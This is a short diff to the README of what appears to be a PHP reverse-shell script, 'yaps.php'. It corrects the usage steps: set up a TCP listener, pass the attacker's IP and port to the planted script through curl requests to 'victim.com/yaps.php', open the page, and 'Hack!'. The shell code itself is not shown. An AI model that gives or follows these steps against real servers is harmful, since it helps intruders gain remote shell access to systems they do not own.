@@ -33,7 +33,7 @@ It's currently in its first version and I haven't tested it much yet, and there 
 1. Set up a TCP listener;
 2. Set your IP and port. This can be done by:
 * 2.1 Editing the variables at the start of the script;
-* 2.2 Setting them via web request (`curl -x POST -d "x=ip&y=post victim.com/yaps.php"` or `curl victim.com/yaps.php?x=ip&y=post`);
+* 2.2 Setting them via web request (`curl -x POST -d "x=ip&y=port" victim.com/yaps.php` or `curl victim.com/yaps.php?x=ip&y=port`);
 3. Open yaps.php on browser or curl it;
 4. Hack!
 
